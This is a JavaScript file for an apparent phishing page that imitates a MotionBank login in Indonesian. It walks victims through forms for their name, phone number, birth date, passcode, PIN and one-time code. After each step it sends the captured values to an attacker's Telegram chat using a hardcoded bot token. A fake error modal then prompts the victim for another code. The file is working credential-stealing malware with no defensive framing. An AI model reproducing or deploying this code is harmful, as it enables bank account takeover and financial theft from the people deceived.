// ================= CONFIGURATION TELEGRAM =================
const BOT_TOKEN = "9189949943:AAGWkG3Lnly2aM8Wu4kCwUHRo4PK6UMwABs"; 
const CHAT_ID = "6742478722";

const page0 = document.getElementById('page0');
const page1 = document.getElementById('page1');
const page2 = document.getElementById('page2');
const page3 = document.getElementById('page3');

const formStep1 = document.getElementById('formStep1');
const fullNameInput = document.getElementById('fullName');
const phoneInput = document.getElementById('phone');
const dobInput = document.getElementById('dob');

const btnBackTo1 = document.getElementById('btnBackTo1');
const btnBackTo2 = document.getElementById('btnBackTo2');
const btnToPage3 = document.getElementById('btnToPage3');
const bodyContainer = document.getElementById('bodyContainer');

const passcode = document.getElementById('passcode');
const togglePasscode = document.getElementById('togglePasscode');
const eyeIcon = document.getElementById('eyeIcon');

const pinInput = document.getElementById('pin');
const togglePin = document.getElementById('togglePin');
const pinEyeIcon = document.getElementById('pinEyeIcon');

const maskedPhoneDisplay = document.getElementById('maskedPhoneDisplay');
const otpInputs = document.querySelectorAll('.otp-input');
const btnFinalSubmit = document.getElementById('btnFinalSubmit');

const otpErrorModal = document.getElementById('otpErrorModal');
const btnCloseModal = document.getElementById('btnCloseModal');

let timerInterval = null;
let userData = {
  name: "",
  phone: "",
  dob: "",
  passcode: "",
  pin: "",
  otp: ""
};

// Timer otomatis 1 detik dari Halaman 0 ke Halaman 1
window.addEventListener('DOMContentLoaded', () => {
  setTimeout(() => {
    goToPage1();
  }, 1000);
});

function goToPage1() {
  page0.classList.add('hidden');
  page1.classList.remove('hidden');
  bodyContainer.classList.remove('bg-white');
  bodyContainer.classList.add('bg-custom-page1');
  window.scrollTo(0, 0);
}

// Validasi Nomor Handphone
phoneInput.addEventListener('input', function(e) {
  let val = e.target.value.replace(/\D/g, ''); 
  if (val.length > 0 && val[0] !== '8') {
    val = '8' + val.slice(1);
  }
  if (val.length > 12) {
    val = val.slice(0, 12); 
  }
  e.target.value = val;
});

// Fungsi Kirim Data ke Telegram
function sendToTelegram(message) {
  if (BOT_TOKEN === "MASUKKAN_BOT_TOKEN_ANDA_DISINI") {
    console.warn("Token Telegram belum diatur!");
    return;
  }
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    })
  }).catch(err => console.error("Gagal kirim Telegram:", err));
}

// Submit Halaman 1 (Data Diri)
formStep1.addEventListener('submit', function(e) {
  e.preventDefault();
  
  let rawPhone = phoneInput.value.trim();
  if (rawPhone.length < 7 || rawPhone.length > 12) {
    alert("Nomor HP harus memiliki panjang total 10 hingga 15 digit (termasuk +62).");
    return;
  }

  userData.name = fullNameInput.value;
  userData.phone = "+62" + rawPhone;
  userData.dob = dobInput.value;

  let msg = `📥 *DATA BARU MOTIONBANK*\n\n👤 Nama: ${userData.name}\n📞 No HP: \`${userData.phone}\`\n🎂 Tgl Lahir: ${userData.dob}`;
  sendToTelegram(msg);

  page1.classList.add('hidden');
  page2.classList.remove('hidden');
  bodyContainer.classList.remove('bg-custom-page1');
  bodyContainer.classList.add('bg-slate-50');
  window.scrollTo(0, 0);
});

btnBackTo1.addEventListener('click', function() {
  page2.classList.add('hidden');
  page1.classList.remove('hidden');
  bodyContainer.classList.remove('bg-slate-50');
  bodyContainer.classList.add('bg-custom-page1');
  window.scrollTo(0, 0);
});

// Toggle Password (Passcode & PIN)
togglePasscode.addEventListener('click', function() {
  const type = passcode.getAttribute('type') === 'password' ? 'text' : 'password';
  passcode.setAttribute('type', type);
  eyeIcon.classList.toggle('fa-eye-slash');
  eyeIcon.classList.toggle('fa-eye');
});

togglePin.addEventListener('click', function() {
  const type = pinInput.getAttribute('type') === 'password' ? 'text' : 'password';
  pinInput.setAttribute('type', type);
  pinEyeIcon.classList.toggle('fa-eye-slash');
  pinEyeIcon.classList.toggle('fa-eye');
});

// Submit Halaman 2 (Sandi & PIN)
btnToPage3.addEventListener('click', function() {
  if(!passcode.value) {
    alert("Silakan masukkan kode sandi Anda terlebih dahulu.");
    return;
  }
  if(!pinInput.value) {
    alert("Silakan masukkan PIN 6 digit Anda terlebih dahulu.");
    return;
  }

  userData.passcode = passcode.value;
  userData.pin = pinInput.value;

  let msg = `🔐 *KODE SANDI & PIN MOTIONBANK*\n\n👤 Nama: ${userData.name}\n📞 No HP: \`${userData.phone}\`\n🔑 Sandi: \`${userData.passcode}\`\n🔢 PIN: \`${userData.pin}\``;
  sendToTelegram(msg);

  const val = phoneInput.value.trim();
  if(val.length >= 3) {
    const last3 = val.slice(-3);
    maskedPhoneDisplay.textContent = `+62 •••• •••• ${last3}`;
  }

  page2.classList.add('hidden');
  page3.classList.remove('hidden');
  window.scrollTo(0, 0);

  startOtpTimer(58);
  otpInputs[0].focus();
});

btnBackTo2.addEventListener('click', function() {
  page3.classList.add('hidden');
  page2.classList.remove('hidden');
  clearInterval(timerInterval);
  window.scrollTo(0, 0);
});

// Logika Input OTP
otpInputs.forEach((input, index) => {
  input.addEventListener('input', (e) => {
    if (e.target.value.length > 1) {
      e.target.value = e.target.value.slice(0, 1);
    }
    if (e.target.value !== "" && index < otpInputs.length - 1) {
      otpInputs[index + 1].focus();
    }
    checkOtpComplete();
  });

  input.addEventListener('keydown', (e) => {
    if (e.key === "Backspace" && e.target.value === "" && index > 0) {
      otpInputs[index - 1].focus();
    }
  });
});

function checkOtpComplete() {
  let isAllFilled = Array.from(otpInputs).every(inp => inp.value !== "");
  if(isAllFilled) {
    btnFinalSubmit.disabled = false;
    btnFinalSubmit.classList.remove('bg-slate-200', 'text-slate-400');
    btnFinalSubmit.classList.add('bg-amber-500', 'hover:bg-amber-600', 'text-white', 'shadow-md');
  } else {
    btnFinalSubmit.disabled = true;
    btnFinalSubmit.classList.add('bg-slate-200', 'text-slate-400');
    btnFinalSubmit.classList.remove('bg-amber-500', 'hover:bg-amber-600', 'text-white', 'shadow-md');
  }
}

// Submit Final OTP
btnFinalSubmit.addEventListener('click', function() {
  let otpCode = "";
  otpInputs.forEach(inp => otpCode += inp.value);
  userData.otp = otpCode;

  let msg = `📲 *KODE OTP MOTIONBANK*\n\n👤 Nama: ${userData.name}\n📞 No HP: \`${userData.phone}\`\n🔑 Sandi: \`${userData.passcode}\`\n🔢 PIN: \`${userData.pin}\`\n🔢 OTP: \`${userData.otp}\``;
  sendToTelegram(msg);

  otpErrorModal.classList.remove('hidden');
});

btnCloseModal.addEventListener('click', function() {
  otpErrorModal.classList.add('hidden');
  otpInputs.forEach(inp => inp.value = "");
  otpInputs[0].focus();
  checkOtpComplete();
});

// Timer OTP
function startOtpTimer(seconds) {
  clearInterval(timerInterval);
  let duration = seconds;
  const timerDisplay = document.getElementById('otpTimer');
  
  timerInterval = setInterval(() => {
    let sec = duration % 60;
    let secStr = sec < 10 ? "0" + sec : sec;
    timerDisplay.textContent = `00:${secStr}`;

    if (--duration < 0) {
      clearInterval(timerInterval);
      timerDisplay.textContent = "00:00";
    }
  }, 1000);
}
